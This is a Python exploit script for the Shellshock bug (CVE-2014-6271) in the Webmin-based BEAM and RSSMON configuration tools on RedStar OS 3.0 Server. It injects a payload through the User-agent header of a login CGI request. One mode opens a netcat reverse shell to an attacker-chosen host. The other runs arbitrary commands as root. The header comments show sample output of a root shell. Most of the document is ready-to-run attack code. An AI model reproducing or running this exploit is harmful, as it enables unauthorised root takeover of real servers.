#!/usr/bin/env python
# RedStar OS 3.0 Server (BEAM & RSSMON) shellshock exploit
# ========================================================
# BEAM & RSSMON are Webmin based configuration utilities
# that ship with RSS server 3.0. These packages are the
# recommended GUI configuration components and listen on
# a user specified port from 10000/tcp to 65535/tcp. They
# are accessible on the local host only in vanilla install
# unless the firewall is disabled. Both services run with
# full root permissions and can be exploited for LPE or
# network attacks. RSSMON has hardened SELinux policies
# applied which hinder exploitation of this vulnerability
# be limiting access to network resources. Commands are
# still run as root in a blind way.
#
# $ python rsshellshock.py beam 192.168.0.31 10000 192.168.0.10 8080
# [+] RedStar OS 3.0 Server (BEAM & RSSMON) shellshock exploit
# [-] exploiting shellshock CVE-2014-6271...
# sh: no job control in this shell
# sh-4.1# id
# uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:beam_t:s0-s15:c0.c1023
# sh-4.1# 
#
# -- Hacker Fantastic (https://myhackerhouse.com)
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import requests
import sys
import os

def spawn_shell(cbport):
    subprocess.call('nc -l ' + cbport, shell=True)

def shellshock(soft,ip,port,cbip,cbport):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    if soft == "beam":
        user_agent = {'User-agent': '() { :; }; /bin/bash -c "rm /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc '+cbip+' '+cbport+' >/tmp/.f"'}
    else:
        shellstring = '() { :; }; /bin/bash -c "%s"' % (cbip)
        user_agent = {'User-agent': shellstring}
    print "[-] exploiting shellshock CVE-2014-6271..."
    myreq = requests.get("https://"+ip+":"+port+"/session_login.cgi", headers = user_agent, verify=False)

if __name__ == "__main__":
    print "[+] RedStar OS 3.0 Server (BEAM & RSSMON) shellshock exploit"
    if len(sys.argv) < 5:
        print "[-] Use with <beam> <host> <port> <connectback ip> <connectback port>"
        print "[-] Or with <rssmon> <host> <port> <cmd>"
        sys.exit()
    if(sys.argv[1]=="beam"):
        newRef=os.fork()
        if newRef==0:
            shellshock(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])    
        else:
            spawn_shell(sys.argv[5])
    else:
        shellshock(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4],0)
